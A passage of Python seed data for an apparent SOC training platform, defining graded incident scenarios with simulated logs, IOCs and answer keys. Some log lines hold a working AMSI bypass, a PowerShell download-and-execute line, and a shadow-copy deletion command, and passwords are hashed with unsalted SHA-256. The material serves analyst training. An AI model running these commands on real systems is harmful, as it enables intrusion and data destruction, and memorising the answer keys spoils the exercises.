"""
SOC Platform Seed Data - 200+ Realistic Scenarios
Covers all major attack categories with realistic logs, IOCs, and MITRE ATT&CK mappings
"""

import sqlite3
import json
import hashlib
from datetime import datetime, timedelta
import random

DATABASE = 'soc_platform.db'

def get_db():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

def hash_password(p):
    return hashlib.sha256(p.encode()).hexdigest()

# ─────────────────────────────────────────────
# ALL SCENARIOS
# ─────────────────────────────────────────────

SCENARIOS = [

# ════════════════════════════════════════
# AUTHENTICATION ATTACKS (25 scenarios)
# ════════════════════════════════════════

{
    "title": "Brute Force Attack - RDP Login Failures",
    "category": "Authentication Attacks",
    "severity": "high",
    "description": "Multiple failed RDP login attempts detected from a single external IP against the domain admin account over 10 minutes.",
    "source": "Windows Security Event Log",
    "source_ip": "185.220.101.47",
    "dest_ip": "10.10.1.50",
    "hostname": "WKSTN-ADMIN01",
    "username": "administrator",
    "expected_verdict": "true_positive",
    "points": 150,
    "hint": "Check Event ID 4625 failure reason codes and the volume of attempts.",
    "solution_explanation": "This is a true positive brute force attack. 847 failed logons from a Tor exit node in 10 minutes is clearly malicious. The expected verdict is true_positive and should be escalated.",
    "host_info": json.dumps({"hostname": "WKSTN-ADMIN01", "os": "Windows Server 2019", "ip": "10.10.1.50", "domain": "CORP.LOCAL", "last_patch": "2024-11-01", "av_status": "Active", "criticality": "High"}),
    "user_info": json.dumps({"username": "administrator", "domain": "CORP", "department": "IT", "last_login": "2024-12-14 08:22:00", "mfa_enabled": False, "failed_logins_30d": 3, "account_status": "Active"}),
    "mitre_mapping": json.dumps({"tactic": "Credential Access", "technique": "T1110.001", "name": "Brute Force: Password Guessing", "url": "https://attack.mitre.org/techniques/T1110/001/"}),
    "logs": [
        {"log_type": "windows_event", "timestamp": "2024-12-15 02:14:03", "source_ip": "185.220.101.47", "dest_ip": "10.10.1.50", "username": "administrator", "event_id": "4625", "raw_log": "EventID: 4625 | An account failed to log on | Account: administrator | Workstation: WKSTN-ADMIN01 | Source IP: 185.220.101.47 | Failure Reason: Unknown user name or bad password | LogonType: 10 (RemoteInteractive)", "highlighted": 1},
        {"log_type": "windows_event", "timestamp": "2024-12-15 02:14:04", "source_ip": "185.220.101.47", "dest_ip": "10.10.1.50", "username": "administrator", "event_id": "4625", "raw_log": "EventID: 4625 | An account failed to log on | Account: administrator | Workstation: WKSTN-ADMIN01 | Source IP: 185.220.101.47 | Failure Reason: Unknown user name or bad password | Attempt #2", "highlighted": 0},
        {"log_type": "windows_event", "timestamp": "2024-12-15 02:14:06", "source_ip": "185.220.101.47", "dest_ip": "10.10.1.50", "username": "administrator", "event_id": "4625", "raw_log": "EventID: 4625 | Attempt #3 | Account: administrator | Source IP: 185.220.101.47", "highlighted": 0},
        {"log_type": "windows_event", "timestamp": "2024-12-15 02:18:44", "source_ip": "185.220.101.47", "dest_ip": "10.10.1.50", "username": "administrator", "event_id": "4625", "raw_log": "EventID: 4625 | Attempt #847 | Account: administrator | Source IP: 185.220.101.47 | Total attempts in 10 min: 847", "highlighted": 1},
        {"log_type": "firewall", "timestamp": "2024-12-15 02:14:00", "source_ip": "185.220.101.47", "dest_ip": "10.10.1.50", "username": "", "event_id": "", "raw_log": "FIREWALL ALLOW | SRC=185.220.101.47:52341 DST=10.10.1.50:3389 PROTO=TCP | GEO: RU (Tor Exit Node) | Policy: ALLOW-RDP-EXTERNAL", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "ip", "value": "185.220.101.47", "description": "Known Tor exit node - brute forcing RDP", "malicious": 1},
    ],
    "timeline": [
        {"event_time": "2024-12-15 02:14:00", "event_type": "Connection", "description": "First RDP connection attempt from 185.220.101.47", "source": "Firewall", "severity": "medium"},
        {"event_time": "2024-12-15 02:14:03", "event_type": "Auth Failure", "description": "First Event ID 4625 - failed logon for administrator", "source": "Windows Security", "severity": "high"},
        {"event_time": "2024-12-15 02:18:44", "event_type": "Brute Force", "description": "847th failed attempt detected - automated attack confirmed", "source": "Windows Security", "severity": "critical"},
        {"event_time": "2024-12-15 02:20:00", "event_type": "Alert Triggered", "description": "SIEM rule: >50 failed logons in 10 minutes from single IP", "source": "SIEM", "severity": "critical"},
    ]
},

{
    "title": "Password Spraying - O365 Multiple Accounts",
    "category": "Authentication Attacks",
    "severity": "critical",
    "description": "Password spraying attack targeting 340 Microsoft 365 accounts with the password 'Winter2024!' over 2 hours. 3 accounts successfully compromised.",
    "source": "Azure AD Sign-in Logs",
    "source_ip": "45.33.32.156",
    "dest_ip": "52.96.0.0",
    "hostname": "M365-CLOUD",
    "username": "multiple",
    "expected_verdict": "true_positive",
    "points": 200,
    "hint": "Password spraying uses one password against many accounts. Look for single password, many accounts, spread timing.",
    "solution_explanation": "Classic password spraying. One password (Winter2024!) tried against 340 accounts with deliberate slow timing to evade lockout policies. 3 successful logins confirms compromise. True positive - immediate action required.",
    "host_info": json.dumps({"hostname": "Azure AD / M365", "os": "Cloud", "ip": "52.96.0.0", "domain": "company.onmicrosoft.com", "mfa_required": "Partial", "criticality": "Critical"}),
    "user_info": json.dumps({"username": "340 accounts targeted", "compromised": ["j.smith@corp.com", "m.jones@corp.com", "a.wilson@corp.com"], "department": "Multiple", "mfa_enabled": False}),
    "mitre_mapping": json.dumps({"tactic": "Credential Access", "technique": "T1110.003", "name": "Brute Force: Password Spraying", "url": "https://attack.mitre.org/techniques/T1110/003/"}),
    "logs": [
        {"log_type": "windows_event", "timestamp": "2024-12-15 09:01:22", "source_ip": "45.33.32.156", "dest_ip": "52.96.0.0", "username": "a.adams@corp.com", "event_id": "AADSTS50126", "raw_log": "Azure AD | FAILED | User: a.adams@corp.com | IP: 45.33.32.156 | Password: [redacted] | Error: AADSTS50126 InvalidUserNameOrPassword | UserAgent: python-requests/2.28", "highlighted": 0},
        {"log_type": "windows_event", "timestamp": "2024-12-15 09:01:58", "source_ip": "45.33.32.156", "dest_ip": "52.96.0.0", "username": "b.baker@corp.com", "event_id": "AADSTS50126", "raw_log": "Azure AD | FAILED | User: b.baker@corp.com | IP: 45.33.32.156 | Error: AADSTS50126 | Timing: 36s between attempts", "highlighted": 0},
        {"log_type": "windows_event", "timestamp": "2024-12-15 10:22:14", "source_ip": "45.33.32.156", "dest_ip": "52.96.0.0", "username": "j.smith@corp.com", "event_id": "4624", "raw_log": "Azure AD | SUCCESS | User: j.smith@corp.com | IP: 45.33.32.156 | Location: Lagos, Nigeria | MFA: NOT REQUIRED | Session granted", "highlighted": 1},
        {"log_type": "windows_event", "timestamp": "2024-12-15 10:45:03", "source_ip": "45.33.32.156", "dest_ip": "52.96.0.0", "username": "m.jones@corp.com", "event_id": "4624", "raw_log": "Azure AD | SUCCESS | User: m.jones@corp.com | IP: 45.33.32.156 | Location: Lagos, Nigeria | MFA: NOT REQUIRED", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "ip", "value": "45.33.32.156", "description": "Linode VPS used for password spraying", "malicious": 1},
        {"ioc_type": "email", "value": "j.smith@corp.com", "description": "Compromised account - password Winter2024!", "malicious": 0},
        {"ioc_type": "email", "value": "m.jones@corp.com", "description": "Compromised account - password Winter2024!", "malicious": 0},
    ],
    "timeline": [
        {"event_time": "2024-12-15 09:01:22", "event_type": "Spray Start", "description": "First authentication attempt - a.adams@corp.com", "source": "Azure AD", "severity": "low"},
        {"event_time": "2024-12-15 09:01:00", "event_type": "Pattern Detection", "description": "Single password 'Winter2024!' attempted against multiple accounts", "source": "SIEM Correlation", "severity": "high"},
        {"event_time": "2024-12-15 10:22:14", "event_type": "Compromise", "description": "Successful login - j.smith@corp.com from Nigeria", "source": "Azure AD", "severity": "critical"},
        {"event_time": "2024-12-15 10:45:03", "event_type": "Compromise", "description": "Successful login - m.jones@corp.com from Nigeria", "source": "Azure AD", "severity": "critical"},
    ]
},

{
    "title": "Credential Stuffing - Web Application Login",
    "category": "Authentication Attacks",
    "severity": "high",
    "description": "Automated credential stuffing attack against customer portal using credentials from known data breach. 1,200 attempts in 30 minutes, 89 successful logins.",
    "source": "Web Application Firewall / Nginx",
    "source_ip": "198.51.100.23",
    "dest_ip": "10.20.5.100",
    "hostname": "WEB-PORTAL01",
    "username": "multiple",
    "expected_verdict": "true_positive",
    "points": 175,
    "hint": "Credential stuffing uses leaked username/password pairs. Success rate is higher than brute force. Check if credentials match known breach data.",
    "solution_explanation": "True positive credential stuffing. High success rate (7.4%) indicates use of valid credential pairs from a breach database. Affects customer accounts.",
    "host_info": json.dumps({"hostname": "WEB-PORTAL01", "os": "Ubuntu 22.04", "ip": "10.20.5.100", "domain": "portal.corp.com", "waf_enabled": True, "criticality": "Critical"}),
    "user_info": json.dumps({"username": "1200 customers targeted", "compromised_count": 89, "department": "Customers", "data_at_risk": "PII, payment info"}),
    "mitre_mapping": json.dumps({"tactic": "Credential Access", "technique": "T1110.004", "name": "Brute Force: Credential Stuffing", "url": "https://attack.mitre.org/techniques/T1110/004/"}),
    "logs": [
        {"log_type": "web", "timestamp": "2024-12-15 14:02:11", "source_ip": "198.51.100.23", "dest_ip": "10.20.5.100", "username": "customer1@gmail.com", "event_id": "401", "raw_log": '198.51.100.23 - - [15/Dec/2024:14:02:11 +0000] "POST /api/login HTTP/1.1" 401 45 "-" "python-requests/2.28.0" rt=0.023', "highlighted": 0},
        {"log_type": "web", "timestamp": "2024-12-15 14:02:12", "source_ip": "198.51.100.23", "dest_ip": "10.20.5.100", "username": "user2@yahoo.com", "event_id": "200", "raw_log": '198.51.100.23 - - [15/Dec/2024:14:02:12 +0000] "POST /api/login HTTP/1.1" 200 312 "-" "python-requests/2.28.0" rt=0.041 | SESSION_CREATED', "highlighted": 1},
        {"log_type": "web", "timestamp": "2024-12-15 14:05:44", "source_ip": "198.51.100.23", "dest_ip": "10.20.5.100", "username": "", "event_id": "", "raw_log": "WAF ALERT: Credential Stuffing Pattern | IP: 198.51.100.23 | Requests/min: 40 | Unique users: 340 | Success rate: 7.4% | Tool signature: Sentry MBA", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "ip", "value": "198.51.100.23", "description": "Credential stuffing origin IP", "malicious": 1},
        {"ioc_type": "url", "value": "https://portal.corp.com/api/login", "description": "Targeted login endpoint", "malicious": 0},
    ],
    "timeline": [
        {"event_time": "2024-12-15 14:02:11", "event_type": "Attack Start", "description": "First credential stuffing attempt", "source": "Nginx", "severity": "medium"},
        {"event_time": "2024-12-15 14:02:12", "event_type": "First Compromise", "description": "First successful login with breached credentials", "source": "App Log", "severity": "critical"},
        {"event_time": "2024-12-15 14:05:44", "event_type": "WAF Alert", "description": "WAF detects credential stuffing pattern - Sentry MBA tool signature", "source": "WAF", "severity": "critical"},
        {"event_time": "2024-12-15 14:32:00", "event_type": "Attack End", "description": "1200 attempts complete, 89 successful", "source": "SIEM", "severity": "critical"},
    ]
},

{
    "title": "Account Lockout Storm - Potential Insider Threat",
    "category": "Authentication Attacks",
    "severity": "medium",
    "description": "User jdoe repeatedly locked out across 5 different workstations in 20 minutes. Could be forgotten password or someone using stolen credentials.",
    "source": "Windows Security Event Log",
    "source_ip": "10.10.1.0/24",
    "dest_ip": "10.10.0.5",
    "hostname": "DC01",
    "username": "jdoe",
    "expected_verdict": "false_positive",
    "points": 100,
    "hint": "Check if user recently changed password or reported issues. Multiple locations could indicate traveling with laptop.",
    "solution_explanation": "False positive. Investigation reveals jdoe changed their password yesterday and hadn't updated it in their cached credentials on multiple devices. IT confirmed via Helpdesk ticket #4421.",
    "host_info": json.dumps({"hostname": "DC01", "os": "Windows Server 2022", "ip": "10.10.0.5", "domain": "CORP.LOCAL", "criticality": "Critical"}),
    "user_info": json.dumps({"username": "jdoe", "domain": "CORP", "department": "Finance", "last_password_change": "2024-12-14", "helpdesk_ticket": "#4421 - Password Reset", "account_status": "Locked"}),
    "mitre_mapping": json.dumps({"tactic": "Credential Access", "technique": "T1110.001", "name": "Brute Force: Password Guessing", "url": "https://attack.mitre.org/techniques/T1110/001/"}),
    "logs": [
        {"log_type": "windows_event", "timestamp": "2024-12-15 08:31:00", "source_ip": "10.10.1.22", "dest_ip": "10.10.0.5", "username": "jdoe", "event_id": "4625", "raw_log": "EventID: 4625 | CORP\\jdoe locked out on WKSTN-FIN01 | Source IP: 10.10.1.22 | Failure: Wrong Password", "highlighted": 0},
        {"log_type": "windows_event", "timestamp": "2024-12-15 08:34:12", "source_ip": "10.10.1.45", "dest_ip": "10.10.0.5", "username": "jdoe", "event_id": "4625", "raw_log": "EventID: 4625 | CORP\\jdoe locked out on WKSTN-FIN02 | Source IP: 10.10.1.45", "highlighted": 0},
        {"log_type": "windows_event", "timestamp": "2024-12-15 08:38:55", "source_ip": "10.10.1.67", "dest_ip": "10.10.0.5", "username": "jdoe", "event_id": "4740", "raw_log": "EventID: 4740 | Account locked out | CORP\\jdoe | Caller: WKSTN-FIN03 | All internal IPs - no external source", "highlighted": 1},
        {"log_type": "windows_event", "timestamp": "2024-12-14 16:45:00", "source_ip": "10.10.0.5", "dest_ip": "10.10.0.5", "username": "jdoe", "event_id": "4723", "raw_log": "EventID: 4723 | Password change attempted | CORP\\jdoe | Changed by: jdoe (self-service) | Password policy compliant", "highlighted": 1},
    ],
    "iocs": [],
    "timeline": [
        {"event_time": "2024-12-14 16:45:00", "event_type": "Password Change", "description": "jdoe changed password via self-service portal", "source": "AD", "severity": "info"},
        {"event_time": "2024-12-15 08:31:00", "event_type": "Lockout", "description": "First lockout on WKSTN-FIN01 - cached credentials", "source": "Windows Security", "severity": "medium"},
        {"event_time": "2024-12-15 08:38:55", "event_type": "Account Locked", "description": "Account locked after 5 workstation failures", "source": "DC01", "severity": "medium"},
        {"event_time": "2024-12-15 09:00:00", "event_type": "Helpdesk Ticket", "description": "Ticket #4421 opened - user jdoe reporting login issues", "source": "Helpdesk", "severity": "low"},
    ]
},

{
    "title": "Kerberoasting Attack Detected",
    "category": "Authentication Attacks",
    "severity": "critical",
    "description": "Suspicious Kerberos TGS requests for service accounts. Single user requested TGS tickets for 47 service accounts in 30 seconds - classic Kerberoasting.",
    "source": "Windows Security Event Log / DC01",
    "source_ip": "10.10.1.88",
    "dest_ip": "10.10.0.5",
    "hostname": "DC01",
    "username": "svc_backup",
    "expected_verdict": "true_positive",
    "points": 200,
    "hint": "Event ID 4769 with Encryption Type 0x17 (RC4) for service accounts is the Kerberoasting signature.",
    "solution_explanation": "True positive Kerberoasting attack. Event ID 4769 with RC4 encryption (0x17) requested en masse for service SPNs indicates offline hash cracking attempt. Compromised user account was used as foothold.",
    "host_info": json.dumps({"hostname": "DC01", "os": "Windows Server 2022", "ip": "10.10.0.5", "domain": "CORP.LOCAL", "criticality": "Critical"}),
    "user_info": json.dumps({"username": "svc_backup", "domain": "CORP", "department": "IT", "account_type": "Service Account", "spn_count": 0, "last_login": "2024-12-15 03:22:00", "normal_behavior": "Runs nightly backup jobs only"}),
    "mitre_mapping": json.dumps({"tactic": "Credential Access", "technique": "T1558.003", "name": "Steal or Forge Kerberos Tickets: Kerberoasting", "url": "https://attack.mitre.org/techniques/T1558/003/"}),
    "logs": [
        {"log_type": "windows_event", "timestamp": "2024-12-15 03:22:14", "source_ip": "10.10.1.88", "dest_ip": "10.10.0.5", "username": "svc_backup", "event_id": "4769", "raw_log": "EventID: 4769 | Kerberos Service Ticket Requested | Account: CORP\\svc_backup | Service: MSSQLSvc/sql01.corp.local:1433 | Ticket Encryption: 0x17 (RC4-HMAC) | Client IP: 10.10.1.88", "highlighted": 1},
        {"log_type": "windows_event", "timestamp": "2024-12-15 03:22:14", "source_ip": "10.10.1.88", "dest_ip": "10.10.0.5", "username": "svc_backup", "event_id": "4769", "raw_log": "EventID: 4769 | TGS Request | Account: CORP\\svc_backup | Service: HTTP/sharepoint.corp.local | Ticket Encryption: 0x17 (RC4-HMAC) | Attempt: 2/47", "highlighted": 1},
        {"log_type": "windows_event", "timestamp": "2024-12-15 03:22:44", "source_ip": "10.10.1.88", "dest_ip": "10.10.0.5", "username": "svc_backup", "event_id": "4769", "raw_log": "EventID: 4769 | TGS Request #47 | TOTAL: 47 service ticket requests in 30 seconds | All RC4 | Tool signature: Rubeus/Impacket", "highlighted": 1},
        {"log_type": "windows_event", "timestamp": "2024-12-15 03:20:00", "source_ip": "10.10.1.88", "dest_ip": "10.10.0.5", "username": "svc_backup", "event_id": "4624", "raw_log": "EventID: 4624 | Successful Logon | CORP\\svc_backup | LogonType: 3 | Source: 10.10.1.88 (WKSTN-DEV04) | UNUSUAL - svc_backup normally logs from backup server only", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "ip", "value": "10.10.1.88", "description": "WKSTN-DEV04 - Kerberoasting origin", "malicious": 1},
        {"ioc_type": "filename", "value": "Rubeus.exe", "description": "Suspected Kerberoasting tool", "malicious": 1},
    ],
    "timeline": [
        {"event_time": "2024-12-15 03:20:00", "event_type": "Initial Access", "description": "svc_backup logs in interactively from unusual workstation WKSTN-DEV04", "source": "Windows Security", "severity": "high"},
        {"event_time": "2024-12-15 03:22:14", "event_type": "Kerberoasting", "description": "Mass TGS ticket requests begin - RC4 encryption requested", "source": "DC01", "severity": "critical"},
        {"event_time": "2024-12-15 03:22:44", "event_type": "Attack Complete", "description": "47 service account hashes extracted in 30 seconds", "source": "DC01", "severity": "critical"},
    ]
},

# ════════════════════════════════════════
# MALWARE (25 scenarios)
# ════════════════════════════════════════

{
    "title": "Ransomware - LockBit 3.0 Execution Detected",
    "category": "Malware",
    "severity": "critical",
    "description": "EDR detected LockBit 3.0 ransomware execution on WKSTN-ACCT05. File encryption in progress. 2,340 files renamed with .lockbit extension in 3 minutes.",
    "source": "CrowdStrike Falcon EDR",
    "source_ip": "10.10.2.55",
    "dest_ip": "185.220.101.99",
    "hostname": "WKSTN-ACCT05",
    "username": "t.nguyen",
    "expected_verdict": "true_positive",
    "points": 250,
    "hint": "Check the process tree - how did ransomware get executed? Look for the initial vector (phishing email, RDP, etc.)",
    "solution_explanation": "True positive LockBit 3.0 ransomware. Phishing email with malicious Excel macro was the entry point. Immediate isolation and IR team escalation required.",
    "host_info": json.dumps({"hostname": "WKSTN-ACCT05", "os": "Windows 10 Pro 22H2", "ip": "10.10.2.55", "domain": "CORP.LOCAL", "av_status": "CrowdStrike Active", "encrypted_files": 2340, "criticality": "High", "network_shares_accessible": ["\\\\fileserver\\finance", "\\\\fileserver\\hr"]}),
    "user_info": json.dumps({"username": "t.nguyen", "domain": "CORP", "department": "Accounting", "last_login": "2024-12-15 08:45:00", "opened_email": "Invoice_Dec2024.xlsm at 08:47"}),
    "mitre_mapping": json.dumps({"tactic": "Impact", "technique": "T1486", "name": "Data Encrypted for Impact", "url": "https://attack.mitre.org/techniques/T1486/"}),
    "logs": [
        {"log_type": "edr", "timestamp": "2024-12-15 08:47:33", "source_ip": "10.10.2.55", "dest_ip": "", "username": "t.nguyen", "event_id": "EDR-CRITICAL", "raw_log": "CrowdStrike | PREVENTION | Process: EXCEL.EXE spawned cmd.exe | CMD: cmd.exe /c powershell -e JABzAGUAcgB2AGUAcgA= | Parent: EXCEL.EXE | SHA256: a3f4c2d1e9b8f7a6... | VERDICT: MALICIOUS", "highlighted": 1},
        {"log_type": "edr", "timestamp": "2024-12-15 08:47:45", "source_ip": "10.10.2.55", "dest_ip": "185.220.101.99", "username": "t.nguyen", "event_id": "EDR-CRITICAL", "raw_log": "CrowdStrike | DETECT | Process: lockbit3.exe | Network: C2 beacon to 185.220.101.99:443 | File ops: WRITE *.lockbit extensions | Status: ENCRYPTION STARTED", "highlighted": 1},
        {"log_type": "edr", "timestamp": "2024-12-15 08:50:12", "source_ip": "10.10.2.55", "dest_ip": "", "username": "t.nguyen", "event_id": "EDR-CRITICAL", "raw_log": "CrowdStrike | ALERT | Files encrypted: 2340 | Extensions: .lockbit | Ransom note: LockBit_Restore.txt created in all directories | Shadow copies: DELETED via vssadmin", "highlighted": 1},
        {"log_type": "windows_event", "timestamp": "2024-12-15 08:47:30", "source_ip": "10.10.2.55", "dest_ip": "", "username": "t.nguyen", "event_id": "4688", "raw_log": "EventID: 4688 | New Process | EXCEL.EXE | PID: 4821 | CommandLine: 'C:\\Program Files\\Microsoft Office\\EXCEL.EXE' C:\\Users\\t.nguyen\\Downloads\\Invoice_Dec2024.xlsm", "highlighted": 0},
        {"log_type": "windows_event", "timestamp": "2024-12-15 08:47:35", "source_ip": "10.10.2.55", "dest_ip": "", "username": "t.nguyen", "event_id": "4688", "raw_log": "EventID: 4688 | New Process | cmd.exe | PID: 5104 | Parent PID: 4821 (EXCEL.EXE) | CommandLine: cmd.exe /c powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JABzAGUAcgB2AGUAcgA=", "highlighted": 1},
        {"log_type": "windows_event", "timestamp": "2024-12-15 08:48:00", "source_ip": "10.10.2.55", "dest_ip": "", "username": "t.nguyen", "event_id": "4688", "raw_log": "EventID: 4688 | New Process | vssadmin.exe | Args: delete shadows /all /quiet | Shadow copy deletion - RANSOMWARE INDICATOR", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "hash", "value": "a3f4c2d1e9b8f7a6c5d4e3f2b1a09887665544332211aabbccddeeff00112233", "description": "LockBit 3.0 dropper SHA256", "malicious": 1},
        {"ioc_type": "ip", "value": "185.220.101.99", "description": "LockBit C2 server", "malicious": 1},
        {"ioc_type": "filename", "value": "Invoice_Dec2024.xlsm", "description": "Phishing attachment with malicious macro", "malicious": 1},
        {"ioc_type": "filename", "value": "LockBit_Restore.txt", "description": "Ransom note", "malicious": 1},
        {"ioc_type": "domain", "value": "lockbit3support.onion", "description": "LockBit payment portal", "malicious": 1},
    ],
    "timeline": [
        {"event_time": "2024-12-15 08:45:00", "event_type": "Email Received", "description": "Phishing email with Invoice_Dec2024.xlsm received by t.nguyen", "source": "Email Gateway", "severity": "high"},
        {"event_time": "2024-12-15 08:47:30", "event_type": "Execution", "description": "EXCEL.EXE opened malicious xlsm file", "source": "EDR", "severity": "critical"},
        {"event_time": "2024-12-15 08:47:33", "event_type": "Macro Execution", "description": "Malicious VBA macro executed - spawned cmd.exe with encoded PowerShell", "source": "EDR", "severity": "critical"},
        {"event_time": "2024-12-15 08:47:45", "event_type": "C2 Connection", "description": "LockBit payload downloaded and C2 beacon established", "source": "EDR/Firewall", "severity": "critical"},
        {"event_time": "2024-12-15 08:48:00", "event_type": "Defense Evasion", "description": "Shadow copies deleted - recovery prevention", "source": "EDR", "severity": "critical"},
        {"event_time": "2024-12-15 08:50:12", "event_type": "Impact", "description": "2340 files encrypted with .lockbit extension", "source": "EDR", "severity": "critical"},
    ]
},

{
    "title": "Suspicious PowerShell - AMSI Bypass Attempt",
    "category": "Malware",
    "severity": "high",
    "description": "PowerShell execution with known AMSI bypass techniques detected. Base64 encoded command attempting to disable Windows Defender scanning.",
    "source": "Windows Event Log / PowerShell SIEM Rule",
    "source_ip": "10.10.3.22",
    "dest_ip": "",
    "hostname": "WKSTN-DEV02",
    "username": "developer1",
    "expected_verdict": "true_positive",
    "points": 175,
    "hint": "Decode the base64 PowerShell command. Look for AMSI bypass strings like [Ref].Assembly.GetType or amsiInitFailed.",
    "solution_explanation": "True positive. Decoded PowerShell shows AMSI bypass followed by Invoke-Mimikatz download from pastebin. Developer account was likely compromised.",
    "host_info": json.dumps({"hostname": "WKSTN-DEV02", "os": "Windows 11 Pro", "ip": "10.10.3.22", "domain": "CORP.LOCAL", "ps_constrained": False, "criticality": "Medium"}),
    "user_info": json.dumps({"username": "developer1", "domain": "CORP", "department": "Development", "admin_rights": True, "last_login": "2024-12-15 10:15:00"}),
    "mitre_mapping": json.dumps({"tactic": "Defense Evasion", "technique": "T1562.001", "name": "Impair Defenses: Disable or Modify Tools", "url": "https://attack.mitre.org/techniques/T1562/001/"}),
    "logs": [
        {"log_type": "windows_event", "timestamp": "2024-12-15 10:22:14", "source_ip": "10.10.3.22", "dest_ip": "", "username": "developer1", "event_id": "4104", "raw_log": "EventID: 4104 | PowerShell Script Block Logging | ScriptBlock: $a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$b=$a.GetField('amsiInitFailed','NonPublic,Static');$b.SetValue($null,$true) | Host: WKSTN-DEV02", "highlighted": 1},
        {"log_type": "windows_event", "timestamp": "2024-12-15 10:22:16", "source_ip": "10.10.3.22", "dest_ip": "pastebin.com", "username": "developer1", "event_id": "4104", "raw_log": "EventID: 4104 | PowerShell | IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/Ab3kL9Xm') | Network download after AMSI bypass", "highlighted": 1},
        {"log_type": "edr", "timestamp": "2024-12-15 10:22:17", "source_ip": "10.10.3.22", "dest_ip": "", "username": "developer1", "event_id": "EDR-HIGH", "raw_log": "CrowdStrike | DETECT | AMSI bypass detected | Process: powershell.exe | Mimikatz credential harvesting tool loaded in memory | LSASS memory access attempted", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "url", "value": "https://pastebin.com/raw/Ab3kL9Xm", "description": "Mimikatz payload download URL", "malicious": 1},
        {"ioc_type": "filename", "value": "Invoke-Mimikatz.ps1", "description": "PowerShell Mimikatz variant", "malicious": 1},
    ],
    "timeline": [
        {"event_time": "2024-12-15 10:22:14", "event_type": "AMSI Bypass", "description": "AMSI bypass via amsiInitFailed field reflection", "source": "PS Script Block Log", "severity": "critical"},
        {"event_time": "2024-12-15 10:22:16", "event_type": "Download", "description": "Mimikatz payload downloaded from pastebin", "source": "Network/PS Log", "severity": "critical"},
        {"event_time": "2024-12-15 10:22:17", "event_type": "Credential Theft", "description": "LSASS access attempted for credential dumping", "source": "EDR", "severity": "critical"},
    ]
},

{
    "title": "Malware C2 - Cobalt Strike Beacon Traffic",
    "category": "Malware",
    "severity": "critical",
    "description": "Network traffic analysis reveals Cobalt Strike beacon communications. JA3 fingerprint matches CS default profile. Jitter timing and malleable C2 profile detected.",
    "source": "Zeek / Suricata IDS",
    "source_ip": "10.10.4.77",
    "dest_ip": "104.21.45.200",
    "hostname": "WKSTN-HR03",
    "username": "h.brown",
    "expected_verdict": "true_positive",
    "points": 225,
    "hint": "Cobalt Strike beacons have distinctive JA3 fingerprints and regular heartbeat intervals with jitter. Check HTTPS to unexpected IPs.",
    "solution_explanation": "True positive Cobalt Strike C2 traffic. JA3 hash matches known CS fingerprint, beacon interval with 10% jitter, and HTTP response sizes match CS malleable profile. Active APT compromise.",
    "host_info": json.dumps({"hostname": "WKSTN-HR03", "os": "Windows 10 Pro", "ip": "10.10.4.77", "domain": "CORP.LOCAL", "criticality": "High"}),
    "user_info": json.dumps({"username": "h.brown", "domain": "CORP", "department": "HR", "access_level": "HR Systems, Personnel Files"}),
    "mitre_mapping": json.dumps({"tactic": "Command and Control", "technique": "T1071.001", "name": "Application Layer Protocol: Web Protocols", "url": "https://attack.mitre.org/techniques/T1071/001/"}),
    "logs": [
        {"log_type": "firewall", "timestamp": "2024-12-15 11:00:00", "source_ip": "10.10.4.77", "dest_ip": "104.21.45.200", "username": "", "event_id": "", "raw_log": "SURICATA | ALERT | ET CNC Cobalt Strike Beacon | SRC: 10.10.4.77:54821 DST: 104.21.45.200:443 | JA3: 72a7c9e6d7b08765f8c2a5e3d4f1b9a0 | Signature: GPL POLICY Suspicious TLS Heartbeat", "highlighted": 1},
        {"log_type": "firewall", "timestamp": "2024-12-15 11:01:00", "source_ip": "10.10.4.77", "dest_ip": "104.21.45.200", "username": "", "event_id": "", "raw_log": "ZEEK | conn.log | 10.10.4.77 -> 104.21.45.200:443 | Duration: 60.3s | Bytes: 482 | Regular interval: ~60s ±10% jitter | BEACON PATTERN", "highlighted": 1},
        {"log_type": "firewall", "timestamp": "2024-12-15 11:02:01", "source_ip": "10.10.4.77", "dest_ip": "104.21.45.200", "username": "", "event_id": "", "raw_log": "ZEEK | ssl.log | Certificate: CN=*.azurewebsites.net (FAKE) | Issuer: Self-signed | JA3: 72a7c9e6d7b08765f8c2a5e3d4f1b9a0 | CS Default Profile Match", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "ip", "value": "104.21.45.200", "description": "Cobalt Strike Team Server", "malicious": 1},
        {"ioc_type": "domain", "value": "cdn-updates.azurewebsites.net.evil.com", "description": "CS malleable C2 domain masquerading as Azure", "malicious": 1},
        {"ioc_type": "hash", "value": "72a7c9e6d7b08765f8c2a5e3d4f1b9a0", "description": "Cobalt Strike JA3 TLS fingerprint", "malicious": 1},
    ],
    "timeline": [
        {"event_time": "2024-12-15 11:00:00", "event_type": "C2 Beacon", "description": "First Cobalt Strike beacon detected by Suricata", "source": "IDS", "severity": "critical"},
        {"event_time": "2024-12-15 11:01:00", "event_type": "Pattern Match", "description": "Zeek confirms ~60s jitter beacon pattern", "source": "Zeek", "severity": "critical"},
        {"event_time": "2024-12-15 11:02:01", "event_type": "SSL Anomaly", "description": "Self-signed cert with Azure domain impersonation", "source": "Zeek SSL", "severity": "critical"},
    ]
},

# ════════════════════════════════════════
# PHISHING (20 scenarios)
# ════════════════════════════════════════

{
    "title": "Spear Phishing - CEO Impersonation BEC",
    "category": "Phishing",
    "severity": "critical",
    "description": "Finance employee received email appearing to be from CEO requesting urgent wire transfer of $247,000. Email originated from lookalike domain corp-inc.com (legitimate: corp.com).",
    "source": "ProofPoint Email Security",
    "source_ip": "209.85.220.41",
    "dest_ip": "10.10.0.25",
    "hostname": "MAIL-GW01",
    "username": "p.white",
    "expected_verdict": "true_positive",
    "points": 200,
    "hint": "Check the actual sender domain vs display name. BEC attacks use lookalike domains. Verify with financial controls.",
    "solution_explanation": "True positive Business Email Compromise. Email from corp-inc.com (not corp.com) impersonating CEO. Social engineering for fraudulent wire transfer. Escalate immediately to Finance and Legal.",
